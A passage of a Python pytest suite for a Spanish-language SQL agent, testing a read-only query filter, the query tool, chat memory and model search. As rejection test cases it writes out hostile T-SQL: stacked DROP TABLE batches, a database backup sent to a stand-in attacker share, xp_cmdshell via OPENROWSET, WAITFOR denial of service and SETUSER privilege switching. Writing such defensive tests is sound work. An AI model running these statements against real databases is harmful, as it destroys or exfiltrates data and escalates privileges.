import os
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import pandas as pd
import pytest
from sqlalchemy import create_engine, text
from sqlalchemy.pool import StaticPool

import agent as modulo_agente
from agent import (
    SQLAgent,
    _donde_vive_de_verdad,
    _tokens_de_modelo,
    buscar_modelos,
    consultar_sql,
    contexto_peticion,
    es_select,
    valores_distintos,
)
from formatting import MAX_ROWS_AS_TEXT

# Bien por encima del umbral que activa el Excel (MAX_ROWS_AS_TEXT), en vez
# de un "30" magico sin relacion aparente con formatting.py.
TOTAL_FILAS = MAX_ROWS_AS_TEXT + 15


@pytest.fixture
def engine():
    motor = create_engine("sqlite://")
    with motor.begin() as conexion:
        conexion.execute(text("CREATE TABLE ventas (tienda TEXT, monto INTEGER)"))
        for i in range(TOTAL_FILAS):
            conexion.execute(
                text("INSERT INTO ventas VALUES (:t, :m)"),
                {"t": f"tienda-{i}", "m": i * 10},
            )
    return motor


def _crear_engine_con_datos(prefijo: str, filas: int = TOTAL_FILAS):
    """Un engine SQLite independiente, con datos propios e identificables.

    `StaticPool` + `check_same_thread=False`: sin esto, "sqlite://" en
    memoria le da a cada hilo su propia conexion (y por lo tanto su propia
    base vacia) via el pool por-hilo de SQLAlchemy. La prueba de
    concurrencia necesita que el hilo que llena la tabla y el hilo que la
    consulta vean la misma base. En produccion esto no aplica: ahi se
    conecta a SQL Server, no a SQLite en memoria.
    """
    motor = create_engine(
        "sqlite://",
        poolclass=StaticPool,
        connect_args={"check_same_thread": False},
    )
    with motor.begin() as conexion:
        conexion.execute(text("CREATE TABLE ventas (tienda TEXT, monto INTEGER)"))
        for i in range(filas):
            conexion.execute(
                text("INSERT INTO ventas VALUES (:t, :m)"),
                {"t": f"{prefijo}-{i}", "m": i},
            )
    return motor


class TestEsSelect:
    def test_acepta_select(self):
        assert es_select("SELECT * FROM ventas") is True

    def test_acepta_select_con_minusculas_y_espacios(self):
        assert es_select("   select 1  ") is True

    def test_acepta_un_cte_que_empieza_con_with(self):
        # El filtro viejo rechazaba esto por empezar con WITH.
        assert es_select("WITH t AS (SELECT 1 AS n) SELECT * FROM t") is True

    def test_acepta_select_entre_parentesis(self):
        assert es_select("(SELECT 1)") is True

    def test_acepta_select_entre_parentesis_anidados(self):
        assert es_select("((SELECT 1))") is True

    def test_rechaza_lote_con_drop(self):
        # El filtro viejo dejaba pasar esto: SQL Server ejecuta el lote completo.
        assert es_select("select 1; drop table ventas") is False

    def test_rechaza_insert(self):
        assert es_select("INSERT INTO ventas VALUES ('x', 1)") is False

    def test_rechaza_drop_escondido_tras_un_comentario(self):
        assert es_select("-- select\ndrop table ventas") is False

    def test_rechaza_drop_tras_comentario_de_bloque(self):
        assert es_select("/* select */ drop table ventas") is False

    def test_tolera_el_punto_y_coma_final(self):
        assert es_select("SELECT 1;") is True

    # --- Regresion de la revision: CTE seguido de DML real (Critico 1) ---

    def test_rechaza_cte_seguido_de_delete(self):
        assert es_select("WITH c AS (SELECT * FROM ventas) DELETE FROM c") is False

    def test_rechaza_cte_seguido_de_insert(self):
        assert es_select(
            "WITH c AS (SELECT * FROM ventas) INSERT INTO c VALUES (1)"
        ) is False

    def test_rechaza_cte_seguido_de_update(self):
        assert es_select("WITH c AS (SELECT * FROM ventas) UPDATE c SET x=1") is False

    # --- Regresion: literales que confunden un borrado de comentarios ingenuo (Critico 2) ---

    def test_rechaza_drop_tras_literal_que_contiene_doble_guion(self):
        # Un regex ingenuo de "--" se come esto como si fuera un comentario
        # real y se traga el ';' que sigue.
        assert es_select("SELECT '--' ; drop table ventas") is False

    def test_rechaza_drop_tras_literal_que_abre_comentario_de_bloque(self):
        assert es_select("SELECT '/*' AS a; drop table ventas /*'*/") is False

    def test_rechaza_drop_tras_comentario_de_bloque_anidado(self):
        # SQL Server anida comentarios de bloque: para el motor, la unica
        # sentencia real aqui es "drop table ventas".
        assert es_select("/* a /* b */ SELECT 1 */ drop table ventas") is False

    def test_rechaza_comentario_de_bloque_sin_cerrar(self):
        assert es_select("/* unclosed") is False

    # --- Regresion: SELECT ... INTO es DDL disfrazada (Importante 5) ---

    def test_rechaza_select_into(self):
        assert es_select("SELECT * INTO copia_ventas FROM ventas") is False

    # --- Regresion: EXEC / sp_executesql, ya se rechazaban, se fijan con prueba ---

    def test_rechaza_exec(self):
        assert es_select("EXEC sp_help") is False

    def test_rechaza_exec_sp_executesql(self):
        assert es_select("exec sp_executesql N'select 1'") is False

    # --- Casos que el filtro anterior rechazaba de mas (falsos rechazos) ---

    def test_acepta_select_de_un_literal_que_es_solo_un_punto_y_coma(self):
        assert es_select("SELECT ';'") is True

    def test_acepta_select_con_drop_dentro_de_un_literal(self):
        assert es_select("SELECT 'a; drop table T' AS texto") is True

    # --- Ronda 2 de la revision: la lista NEGRA era estructuralmente
    # perdedora. T-SQL no exige punto y coma entre sentencias, asi que un
    # lote pegado es UNA sola sentencia para sqlparse, y ninguna de estas
    # palabras estaba en la lista negra anterior (insert/update/delete/
    # merge/drop/alter/create/truncate/exec/execute/grant/revoke/into). La
    # lista BLANCA las rechaza por default, sin haberlas anticipado una por
    # una. ---

    def test_rechaza_backup_database(self):
        assert es_select(
            r"SELECT 1 BACKUP DATABASE master TO DISK = '\\atacante\share\db.bak'"
        ) is False

    def test_rechaza_restore_database(self):
        assert es_select("SELECT 1 RESTORE DATABASE x FROM DISK = 1") is False

    def test_rechaza_shutdown(self):
        assert es_select("SELECT 1 SHUTDOWN") is False

    def test_rechaza_kill(self):
        assert es_select("SELECT 1 KILL 55") is False

    def test_rechaza_waitfor_delay(self):
        # Negacion de servicio sin necesitar ningun privilegio especial.
        assert es_select("SELECT 1 WAITFOR DELAY '23:59:59' SELECT 2") is False

    def test_rechaza_waitfor_delay_sin_segundo_select(self):
        assert es_select("SELECT 1 WAITFOR DELAY '23:59:59'") is False

    def test_rechaza_deny(self):
        assert es_select("SELECT 1 DENY SELECT ON ventas TO publico") is False

    def test_rechaza_use_otra_base(self):
        # Salta la frontera entre bases: el problema multi-base que el
        # proyecto ya tiene documentado en CLAUDE.md.
        assert es_select("SELECT 1 USE [GTM BI Database] SELECT * FROM nomina") is False

    def test_rechaza_dbcc(self):
        assert es_select("SELECT 1 DBCC FREEPROCCACHE") is False

    def test_rechaza_reconfigure(self):
        assert es_select("SELECT 1 RECONFIGURE") is False

    def test_rechaza_disable_trigger(self):
        assert es_select("SELECT 1 DISABLE TRIGGER ALL ON ventas") is False

    def test_rechaza_set_identity_insert(self):
        assert es_select("SELECT 1 SET IDENTITY_INSERT ventas ON") is False

    def test_rechaza_checkpoint(self):
        assert es_select("SELECT 1 CHECKPOINT") is False

    # --- Importante nuevo: ejecucion remota por literal via linked server ---

    def test_rechaza_openquery(self):
        assert es_select("SELECT * FROM OPENQUERY(srv, 'DELETE FROM t')") is False

    def test_rechaza_openrowset(self):
        assert es_select(
            "SELECT * FROM OPENROWSET('SQLNCLI','Server=x;',"
            "'EXEC master..xp_cmdshell ''dir''')"
        ) is False

    def test_rechaza_openquery_con_drop(self):
        assert es_select("SELECT * FROM OPENQUERY(srv, N'DROP TABLE t')") is False

    # --- Red de seguridad: consultas de lectura legitimas que deben seguir
    # pasando. Si alguna de estas fallara, la lista blanca quedo demasiado
    # estrecha. ---

    def test_acepta_join_con_alias(self):
        assert es_select(
            "SELECT v.tienda, c.nombre FROM ventas v "
            "INNER JOIN clientes c ON v.cliente_id = c.id"
        ) is True

    def test_acepta_group_by_con_having(self):
        assert es_select(
            "SELECT tienda, COUNT(*) AS n FROM ventas "
            "GROUP BY tienda HAVING COUNT(*) > 5"
        ) is True

    def test_acepta_funcion_de_ventana_con_over_partition_by(self):
        assert es_select(
            "SELECT tienda, ROW_NUMBER() OVER "
            "(PARTITION BY tienda ORDER BY monto DESC) AS rn FROM ventas"
        ) is True

    def test_acepta_case_when(self):
        assert es_select(
            "SELECT CASE WHEN monto > 100 THEN 'alto' ELSE 'bajo' END AS categoria "
            "FROM ventas"
        ) is True

    def test_acepta_union_all(self):
        assert es_select(
            "SELECT tienda FROM ventas UNION ALL SELECT tienda FROM otras_ventas"
        ) is True

    def test_acepta_dos_ctes_encadenados(self):
        assert es_select(
            "WITH a AS (SELECT 1 AS n), b AS (SELECT 2 AS n) "
            "SELECT * FROM a JOIN b ON a.n = b.n"
        ) is True

    def test_acepta_top_con_order_by(self):
        assert es_select("SELECT TOP 10 tienda, monto FROM ventas ORDER BY monto DESC") is True

    def test_acepta_cast(self):
        assert es_select("SELECT CAST(monto AS VARCHAR(10)) FROM ventas") is True

    # --- Comandos RESERVADOS de T-SQL que sqlparse tipa como Token.Name, asi
    # que la lista blanca de palabras clave no los veia y devolvian True. Los
    # cierra `_RESERVADAS_TSQL`, que se compara contra el texto de TODOS los
    # tokens sin importar como los haya clasificado sqlparse. ---

    def test_rechaza_writetext(self):
        # Escritura real sobre una columna text/ntext/image. El text pointer
        # que necesita se consigue con `SELECT TEXTPTR(col) FROM t`, un SELECT
        # puro que el filtro acepta: una peticion lo obtiene y la siguiente lo
        # pega como literal para escribir.
        assert es_select(
            "SELECT 1 WRITETEXT ventas.tienda 0x0000000000000000 'hackeada'"
        ) is False

    def test_rechaza_updatetext(self):
        assert es_select("SELECT 1 UPDATETEXT ventas.tienda 0x0000 0 0 'x'") is False

    def test_rechaza_readtext(self):
        assert es_select("SELECT 1 READTEXT ventas.tienda 0x0000 0 10") is False

    def test_rechaza_setuser(self):
        # Cambia el contexto de usuario: lo que venga despues corre con otros
        # permisos.
        assert es_select("SELECT 1 SETUSER 'dbo'") is False

    def test_rechaza_revert(self):
        assert es_select("SELECT 1 REVERT") is False

    def test_rechaza_raiserror_with_log(self):
        assert es_select("SELECT 1 RAISERROR('x',20,1) WITH LOG") is False

    def test_rechaza_save_tran(self):
        assert es_select("SELECT 1 SAVE TRAN x") is False

    def test_rechaza_fetch_de_cursor(self):
        # FETCH esta permitido como paginacion (OFFSET ... FETCH NEXT), pero
        # sin un OFFSET previo solo puede ser la lectura de un cursor.
        assert es_select("SELECT 1 FETCH NEXT FROM cur") is False

    # --- Construcciones de SOLO LECTURA que la lista blanca rechazaba de mas.
    # Ninguna ejecuta, escribe ni cambia estado. ---

    def test_acepta_dateadd_de_los_ultimos_siete_dias(self):
        # La consulta insignia del producto ("ventas de los ultimos 7 dias").
        # Antes se rechazaba con "palabra clave no permitida: DAY".
        assert es_select("SELECT DATEADD(day, -7, GETDATE())") is True

    @pytest.mark.parametrize("funcion", ["DATEADD", "DATEDIFF", "DATEPART"])
    @pytest.mark.parametrize(
        "parte",
        ["day", "month", "year", "week", "hour", "minute", "second", "quarter"],
    )
    def test_acepta_todas_las_combinaciones_de_datepart(self, funcion, parte):
        assert es_select(f"SELECT {funcion}({parte}, fecha, GETDATE()) FROM ventas") is True

    def test_acepta_for_xml_path(self):
        assert es_select("SELECT tienda FROM ventas FOR XML PATH('v')") is True

    def test_acepta_for_json_auto(self):
        assert es_select("SELECT tienda FROM ventas FOR JSON AUTO") is True

    def test_acepta_collate(self):
        assert es_select(
            "SELECT tienda FROM ventas ORDER BY tienda COLLATE Latin1_General_CI_AS"
        ) is True

    def test_acepta_pivot(self):
        assert es_select(
            "SELECT * FROM ventas PIVOT (SUM(monto) FOR tienda IN ([a],[b])) p"
        ) is True

    def test_acepta_unpivot(self):
        assert es_select(
            "SELECT * FROM ventas UNPIVOT (monto FOR tienda IN (a, b)) u"
        ) is True

    def test_acepta_tablesample(self):
        assert es_select("SELECT * FROM ventas TABLESAMPLE (10 PERCENT)") is True

    def test_acepta_at_time_zone(self):
        assert es_select("SELECT fecha AT TIME ZONE 'UTC' FROM ventas") is True

    def test_acepta_grouping_sets(self):
        assert es_select(
            "SELECT tienda, SUM(monto) FROM ventas "
            "GROUP BY GROUPING SETS ((tienda), ())"
        ) is True

    def test_acepta_marco_de_ventana_rows_between(self):
        assert es_select(
            "SELECT SUM(monto) OVER (ORDER BY fecha "
            "ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) FROM ventas"
        ) is True

    def test_acepta_comparacion_con_any(self):
        assert es_select(
            "SELECT * FROM ventas WHERE monto > ANY (SELECT monto FROM otras)"
        ) is True

    def test_acepta_comparacion_con_some(self):
        assert es_select(
            "SELECT * FROM ventas WHERE monto > SOME (SELECT monto FROM otras)"
        ) is True

    def test_acepta_like_con_escape(self):
        assert es_select(
            "SELECT * FROM ventas WHERE tienda LIKE '%x!%%' ESCAPE '!'"
        ) is True

    def test_acepta_option_recompile(self):
        assert es_select("SELECT * FROM ventas OPTION (RECOMPILE)") is True

    def test_acepta_paginacion_con_offset_y_fetch(self):
        # El otro lado de la regla de FETCH: con OFFSET delante si es
        # paginacion legitima.
        assert es_select(
            "SELECT tienda FROM ventas ORDER BY monto "
            "OFFSET 10 ROWS FETCH NEXT 5 ROWS ONLY"
        ) is True

    def test_acepta_funciones_reservadas_de_solo_lectura(self):
        # COALESCE/NULLIF/CONVERT/TRY_CONVERT son palabras RESERVADAS de
        # T-SQL: sin permiso explicito, la regla nueva las bloquearia y
        # romperia consultas basicas.
        assert es_select(
            "SELECT COALESCE(tienda, 's/d'), NULLIF(monto, 0), "
            "CONVERT(int, monto), TRY_CONVERT(int, monto) FROM ventas"
        ) is True

    def test_acepta_current_timestamp(self):
        assert es_select("SELECT CURRENT_TIMESTAMP") is True

    def test_acepta_top_con_percent(self):
        assert es_select("SELECT TOP 10 PERCENT * FROM ventas ORDER BY monto DESC") is True

    def test_acepta_columna_con_nombre_reservado_entre_corchetes(self):
        # La regla nueva mira el texto de cada token; un identificador
        # delimitado no es la palabra reservada, es una columna con un nombre
        # desafortunado.
        assert es_select("SELECT [backup] FROM t") is True

    def test_acepta_columna_reservada_entre_corchetes_en_where_y_order_by(self):
        assert es_select(
            "SELECT [restore], [kill] FROM t WHERE [backup] = 1 ORDER BY [backup]"
        ) is True



class TestConsultarSql:
    def test_pocas_filas_devuelven_texto_sin_archivo(self, engine):
        # WHERE en vez de LIMIT: LIMIT es sintaxis de SQLite/MySQL, no de
        # T-SQL, y la lista blanca de es_select() solo acepta palabras clave
        # de lectura genuinas de T-SQL (ver Ronda 2 de la revision).
        with contexto_peticion(engine) as ctx:
            salida = consultar_sql.invoke(
                {"query": "SELECT * FROM ventas WHERE monto < 30"}
            )
        assert "tienda-0" in salida
        assert ctx.archivos == []

    def test_muchas_filas_generan_excel(self, engine, tmp_path, monkeypatch):
        # EXPORT_DIR, no chdir: desde el Critico 1 de la revision final,
        # excel_exporter ya no resuelve el directorio de salida contra el
        # cwd del proceso (ese era justo el bug), asi que cambiar el cwd de
        # la prueba ya no aisla nada. La variable de entorno es la forma
        # soportada de decirle donde escribir.
        monkeypatch.setenv("EXPORT_DIR", str(tmp_path))
        with contexto_peticion(engine) as ctx:
            salida = consultar_sql.invoke({"query": "SELECT * FROM ventas"})
        assert "Excel" in salida
        assert len(ctx.archivos) == 1
        assert ctx.archivos[0].endswith(".xlsx")
        assert os.path.isabs(ctx.archivos[0])

    def test_dos_consultas_dejan_un_solo_reporte_el_primero(
        self, engine, tmp_path, monkeypatch
    ):
        # Una pregunta, un archivo. Antes se acumulaban: el usuario pidio
        # agregar el modelo a un reporte de ventas y recibio DOS Excel --
        # 11 501 filas de ventas sin el modelo, y 4 509 nombres de modelo sin
        # ventas-- cuando queria una sola tabla con ambas cosas.
        #
        # Se queda el PRIMERO: una consulta que falla no genera archivo, asi
        # que la primera exitosa es la respuesta, y lo que venga despues en la
        # misma vuelta son comprobaciones. Quedandose con el ultimo, una
        # prueba real mando la lista de 16 retailers en vez de las ventas.
        monkeypatch.setenv("EXPORT_DIR", str(tmp_path))
        with contexto_peticion(engine) as ctx:
            consultar_sql.invoke({"query": "SELECT * FROM ventas"})
            primero = ctx.archivos[0]
            consultar_sql.invoke({"query": "SELECT tienda FROM ventas"})

        assert ctx.archivos == [primero]

    def test_rechaza_sql_que_no_es_select(self, engine):
        with contexto_peticion(engine) as ctx:
            salida = consultar_sql.invoke({"query": "DROP TABLE ventas"})
        assert "solo" in salida.lower()
        assert ctx.archivos == []
        # Y la tabla sigue ahi.
        with engine.connect() as conexion:
            assert conexion.execute(text("SELECT COUNT(*) FROM ventas")).scalar() == TOTAL_FILAS

    def test_cte_seguido_de_insert_no_se_ejecuta(self, engine):
        # No basta con que es_select() devuelva False en aislado: hay que
        # probar que consultar_sql de verdad no ejecuta nada contra la base
        # (Critico 1 de la revision).
        with contexto_peticion(engine) as ctx:
            salida = consultar_sql.invoke(
                {
                    "query": (
                        "WITH c AS (SELECT * FROM ventas) "
                        "INSERT INTO ventas VALUES ('hackeada', 999)"
                    )
                }
            )
        assert "solo" in salida.lower()
        assert ctx.archivos == []
        with engine.connect() as conexion:
            assert conexion.execute(text("SELECT COUNT(*) FROM ventas")).scalar() == TOTAL_FILAS

    def test_un_error_de_sql_no_revienta_la_herramienta(self, engine):
        with contexto_peticion(engine):
            salida = consultar_sql.invoke({"query": "SELECT * FROM tabla_que_no_existe"})
        # No basta con "error" en el texto: el mensaje de rechazo del filtro
        # tambien dice "Error", asi que una prueba que solo busque esa
        # palabra pasaria igual si es_select rechazara esta consulta por
        # error. Se exige el mensaje especifico de fallo de ejecucion y se
        # excluye explicitamente el de rechazo.
        assert "ejecutar la consulta" in salida.lower()
        assert "solo se permiten" not in salida.lower()

    def test_sin_contexto_activo_falla_claro(self):
        with pytest.raises(RuntimeError, match="contexto"):
            consultar_sql.invoke({"query": "SELECT 1"})

    def test_no_interpreta_dos_puntos_como_parametro_de_vinculo(self, engine):
        # pd.read_sql(text(query), ...) hace que SQLAlchemy trate ":algo"
        # como bind parameter y revienta con "A value is required for bind
        # parameter". El SQL del usuario debe viajar crudo al driver.
        with engine.begin() as conexion:
            conexion.execute(
                text("INSERT INTO ventas VALUES (:t, :m)"), {"t": " :raro", "m": 1}
            )
        with contexto_peticion(engine):
            salida = consultar_sql.invoke(
                {"query": "SELECT tienda FROM ventas WHERE tienda = ' :raro'"}
            )
        assert "error" not in salida.lower()
        assert ":raro" in salida

    def test_dos_peticiones_concurrentes_no_se_pisan_el_excel(self, tmp_path, monkeypatch):
        # Version anterior de esta prueba era secuencial (dos `with
        # contexto_peticion(...)` uno detras del otro): habria pasado igual
        # con la global _db_instance que esta tarea vino a matar, y no
        # detecta que excel_exporter nombra los archivos con resolucion de
        # un segundo. Aqui dos peticiones de verdad corren en paralelo, con
        # datos propios, y se fija el reloj para que ambas caigan en el
        # mismo segundo: asi se reproduce de forma determinista la colision
        # que encontro el Critico 3, sin depender de ganarle a una ventana
        # de un segundo real.
        monkeypatch.setenv("EXPORT_DIR", str(tmp_path))

        tiempo_fijo = datetime(2024, 1, 1, 12, 0, 0)

        class _RelojFijo:
            @staticmethod
            def now():
                return tiempo_fijo

        monkeypatch.setattr("excel_exporter.datetime", _RelojFijo)

        motor_a = _crear_engine_con_datos("A")
        motor_b = _crear_engine_con_datos("B")

        barrera = threading.Barrier(2)
        rutas: dict[str, str] = {}

        def peticion(nombre: str, motor):
            barrera.wait()  # ambos hilos entran a la vez, mismo instante logico
            with contexto_peticion(motor) as ctx:
                consultar_sql.invoke({"query": "SELECT * FROM ventas"})
                rutas[nombre] = ctx.archivos[0]

        with ThreadPoolExecutor(max_workers=2) as pool:
            futuro_a = pool.submit(peticion, "a", motor_a)
            futuro_b = pool.submit(peticion, "b", motor_b)
            futuro_a.result()
            futuro_b.result()

        assert rutas["a"] != rutas["b"]

        datos_a = pd.read_excel(rutas["a"])
        datos_b = pd.read_excel(rutas["b"])
        assert datos_a["tienda"].iloc[0].startswith("A-")
        assert datos_b["tienda"].iloc[0].startswith("B-")


class TestToolkitDelAgente:
    def test_solo_quedan_las_herramientas_propias(self, engine, monkeypatch):
        # Importante 4: create_sql_agent(db=...) arma ademas el toolkit
        # estandar, que trae sql_db_query -- una herramienta que ejecuta SQL
        # arbitrario sin pasar por es_select. Se construye el agente (sin
        # invocarlo, no se toca el LLM) y se verifica que no quede ninguna
        # herramienta del toolkit estandar: ni sql_db_query, ni las de
        # exploracion de esquema, que reflejan `master` (la base del
        # connection string) y por tanto no ven ningun dato de negocio. El
        # esquema lo aporta `describir_objeto`, del modulo catalogo.
        monkeypatch.setenv("OPENROUTER_API_KEY", "clave-de-prueba")
        agente = SQLAgent(engine=engine)
        nombres = {herramienta.name for herramienta in agente.agent_executor.tools}
        assert nombres == {
            "consultar_sql",
            "describir_objeto",
            "buscar_modelos",
            "valores_distintos",
        }


class _EjecutorEspia:
    """Reemplaza al agent_executor: registra lo invocado sin llamar al LLM."""

    def __init__(self, respuesta: str = "listo"):
        self.respuesta = respuesta
        self.invocaciones: list[dict] = []

    def invoke(self, payload: dict) -> dict:
        # Copia: `responder` pasa una lista nueva, pero el historial que
        # contiene se sigue mutando turno a turno.
        self.invocaciones.append(
            {"input": payload["input"], "chat_history": list(payload["chat_history"])}
        )
        return {"output": self.respuesta}


def _agente_espiado(engine, monkeypatch, respuesta: str = "listo"):
    monkeypatch.setenv("OPENROUTER_API_KEY", "clave-de-prueba")
    agente = SQLAgent(engine=engine)
    agente.agent_executor = _EjecutorEspia(respuesta)
    return agente


class TestMemoriaConversacional:
    def test_el_prompt_tiene_hueco_para_el_historial(self, engine, monkeypatch):
        from langchain_core.prompts import ChatPromptTemplate

        monkeypatch.setenv("OPENROUTER_API_KEY", "clave-de-prueba")
        agente = SQLAgent(engine=engine)
        prompts = [
            paso
            for paso in agente.agent_executor.agent.runnable.steps
            if isinstance(paso, ChatPromptTemplate)
        ]
        assert len(prompts) == 1
        assert "chat_history" in prompts[0].input_variables

    def test_la_primera_pregunta_va_sin_historial(self, engine, monkeypatch):
        agente = _agente_espiado(engine, monkeypatch)
        agente.responder("cuantos carriers maneja Coppel?")
        assert agente.agent_executor.invocaciones[0]["chat_history"] == []

    def test_la_segunda_pregunta_lleva_la_primera(self, engine, monkeypatch):
        # El caso que justifica la memoria: "y de Elektra?" no se puede
        # resolver sin saber que la pregunta anterior era sobre carriers.
        agente = _agente_espiado(engine, monkeypatch, respuesta="Coppel maneja 4.")
        agente.responder("cuantos carriers maneja Coppel?")
        agente.responder("y de Elektra?")

        historial = agente.agent_executor.invocaciones[1]["chat_history"]
        assert [m.content for m in historial] == [
            "cuantos carriers maneja Coppel?",
            "Coppel maneja 4.",
        ]

    def test_el_historial_se_recorta_conservando_lo_reciente(self, engine, monkeypatch):
        # Sin tope, cada turno agranda un prompt que ya carga el catalogo
        # entero. Se descartan los turnos viejos, nunca los ultimos.
        agente = _agente_espiado(engine, monkeypatch)
        for i in range(12):
            agente.responder(f"pregunta {i}")

        assert len(agente.historial) == SQLAgent.MAX_MENSAJES_HISTORIAL
        assert agente.historial[0].content == "pregunta 7"
        assert agente.historial[-1].content == "listo"

    def test_cada_conversacion_tiene_su_propio_historial(self, engine, monkeypatch):
        # RegistroSesiones crea un SQLAgent por chat_id. Si el historial fuera
        # de clase y no de instancia, un usuario veria las preguntas de otro.
        uno = _agente_espiado(engine, monkeypatch)
        otro = _agente_espiado(engine, monkeypatch)
        uno.responder("ventas de Coppel")

        assert len(uno.historial) == 2
        assert otro.historial == []

    def test_una_pregunta_fallida_no_entra_al_historial(self, engine, monkeypatch):
        # api._ejecutar convierte la excepcion en un mensaje de error generico
        # para el usuario. Guardar ese turno le ensenaria al modelo un
        # intercambio que nunca ocurrio.
        agente = _agente_espiado(engine, monkeypatch)

        def explotar(payload):
            raise RuntimeError("el proveedor del modelo esta saturado")

        agente.agent_executor.invoke = explotar
        with pytest.raises(RuntimeError):
            agente.responder("ventas de Coppel")

        assert agente.historial == []


class TestObjetoEnLaBaseEquivocada:
    """Cubre un fallo real de produccion (log del 2026-09-15).

    Alguien pregunto por las ventas de los modelos "magic" y el agente genero
    `FROM [GTM BI Database].dbo.[ETL_Consolidado_B2B]`. La vista existe, pero
    en RAW_DATA_B2B. SQL Server contesta "Invalid object name" sin decir donde
    SI esta, asi que el modelo reintento la misma consulta, volvio a fallar
    igual, y agoto los 90 segundos de timeout: el usuario recibio un 504 y su
    reenvio choco con un 429.
    """

    def _error(self, nombre: str) -> Exception:
        # Mismo texto que devuelve el driver ODBC.
        return RuntimeError(
            f"('42S02', \"[42S02] [Microsoft][ODBC Driver 18 for SQL Server]"
            f"[SQL Server]Invalid object name '{nombre}'. (208)\")"
        )

    def test_dice_en_que_base_esta_de_verdad(self):
        pista = _donde_vive_de_verdad(
            self._error("GTM BI Database.dbo.ETL_Consolidado_B2B")
        )
        assert "[RAW_DATA_B2B].dbo.[ETL_Consolidado_B2B]" in pista

    def test_nombra_las_dos_bases_cuando_el_objeto_esta_repetido(self):
        # VW_TELCEL_B2B_SO_LC existe en GTM BI Database y en
        # GTM_BI_INVENTORIES: quedarse con una sola mandaria al modelo a la
        # equivocada la mitad de las veces.
        pista = _donde_vive_de_verdad(self._error("loquesea.dbo.VW_TELCEL_B2B_SO_LC"))
        assert "[GTM BI Database].dbo.[VW_TELCEL_B2B_SO_LC]" in pista
        assert "[GTM_BI_INVENTORIES].dbo.[VW_TELCEL_B2B_SO_LC]" in pista

    def test_no_inventa_nada_si_el_objeto_no_existe(self):
        assert _donde_vive_de_verdad(self._error("dbo.TablaQueNoExiste")) == ""

    def test_ignora_los_errores_que_no_son_de_nombre(self):
        assert _donde_vive_de_verdad(RuntimeError("Conversion failed: 'Nov' to int")) == ""

    def test_la_pista_viaja_con_el_error_al_modelo(self):
        # Lo que importa: que la correccion llegue al modelo pegada al error,
        # que es lo unico que este ve. El motor va simulado porque el fixture
        # de pruebas es SQLite y ahi el mismo SQL falla con "syntax error",
        # no con el "Invalid object name" de SQL Server.
        class _CursorQueFalla:
            def __init__(self, error):
                self._error = error
                self.description = None

            def execute(self, *_):
                raise self._error

            def close(self):
                pass

        class _MotorQueFalla:
            def __init__(self, error):
                self._error = error
                # `consultar_sql` va por el cursor crudo para poder abortar el
                # SELECT a media ejecucion; el motor simulado replica esa
                # forma: engine -> connection -> cursor().
                self.connection = self

            def connect(self):
                return self

            def __enter__(self):
                return self

            def __exit__(self, *_):
                return False

            def cursor(self):
                return _CursorQueFalla(self._error)

        motor = _MotorQueFalla(self._error("GTM BI Database.dbo.ETL_Consolidado_B2B"))
        with contexto_peticion(motor):
            respuesta = consultar_sql.invoke(
                {"query": "SELECT * FROM [GTM BI Database].dbo.[ETL_Consolidado_B2B]"}
            )
        assert "Error al ejecutar la consulta" in respuesta
        assert "[RAW_DATA_B2B].dbo.[ETL_Consolidado_B2B]" in respuesta


class _MotorDeCatalogo:
    """Motor simulado que devuelve filas de modelos y guarda lo consultado."""

    def __init__(self, filas):
        self.filas = filas
        self.sql = None
        self.parametros = None
        # Lo que SQLAlchemy expone como conexion cruda. En None, el
        # presupuesto de tiempo de `valores_distintos` no encuentra donde
        # fijar el timeout y sigue de largo, que es lo correcto fuera de
        # pyodbc.
        self.connection = None

    def connect(self):
        return self

    def __enter__(self):
        return self

    def __exit__(self, *_):
        return False

    def exec_driver_sql(self, sql, parametros=None):
        self.sql, self.parametros = sql, parametros
        return self

    def fetchall(self):
        return self.filas


class TestBuscarModelos:
    """Un usuario dice "magic" y se refiere a varios modelos de Honor.

    Los nombres comerciales no estan escritos igual en todas las fuentes -- el
    catalogo dice 'HONOR MAGIC 8 LITE 512GB 5G' y la vista de ventas
    'HONOR MAGIC8 LITE 512GB 5G', sin espacio -- asi que un LIKE con el nombre
    tal como lo dijo el usuario no encuentra nada, y uno con solo 'magic'
    arrastra RED MAGIC (otra marca), los MagicBook (laptops) y hasta el Magic
    Keyboard de Apple.
    """

    def test_parte_el_texto_en_palabras_y_numeros(self):
        assert _tokens_de_modelo("magic 8 lite") == ["magic", "8", "lite"]

    def test_los_comodines_de_like_no_sobreviven(self):
        # Un token con % o _ se comportaria como comodin dentro del LIKE. El
        # guion bajo importa: en LIKE vale por "un caracter cualquiera".
        assert _tokens_de_modelo("magic%_8") == ["magic", "8"]

    def test_se_topan_los_tokens(self):
        muchos = " ".join(str(i) for i in range(20))
        assert len(_tokens_de_modelo(muchos)) == 5

    def test_un_like_por_token_unidos_con_and(self):
        # Es lo que hace que 'magic 8' encuentre tanto 'MAGIC 8 LITE' como
        # 'MAGIC8 LITE': los tokens se buscan sueltos, no como frase.
        motor = _MotorDeCatalogo([("HONOR MAGIC 8 LITE 512GB 5G", "HONOR", 9)])
        with contexto_peticion(motor):
            buscar_modelos.invoke({"texto": "magic 8"})

        assert motor.sql.count("LIKE ?") == 2
        assert " AND " in motor.sql
        assert motor.parametros == ("%magic%", "%8%")

    def test_agrupa_por_marca_y_avisa_cuando_hay_varias(self):
        motor = _MotorDeCatalogo(
            [
                ("HONOR MAGIC 7 PRO 512GB 5G", "HONOR", 21),
                ("REDMAGIC 10S PRO 256GB 5G", "RED MAGIC", 2),
            ]
        )
        with contexto_peticion(motor):
            respuesta = buscar_modelos.invoke({"texto": "magic pro"})

        assert "HONOR:" in respuesta and "RED MAGIC:" in respuesta
        assert "MARCAS DISTINTAS" in respuesta

    def test_una_sola_marca_no_dispara_el_aviso(self):
        motor = _MotorDeCatalogo([("HONOR MAGIC 8 LITE 512GB 5G", "HONOR", 39)])
        with contexto_peticion(motor):
            respuesta = buscar_modelos.invoke({"texto": "magic 8 lite"})

        assert "MARCAS DISTINTAS" not in respuesta

    def test_siempre_explica_como_filtrar(self):
        # Saber que modelos existen no basta: el agente tiene que saber que el
        # nombre del catalogo no sirve tal cual contra las ventas.
        motor = _MotorDeCatalogo([("HONOR MAGIC 8 LITE 512GB 5G", "HONOR", 39)])
        with contexto_peticion(motor):
            respuesta = buscar_modelos.invoke({"texto": "magic"})

        assert "LIKE" in respuesta and "AND" in respuesta

    def test_sin_resultados_no_inventa_modelos(self):
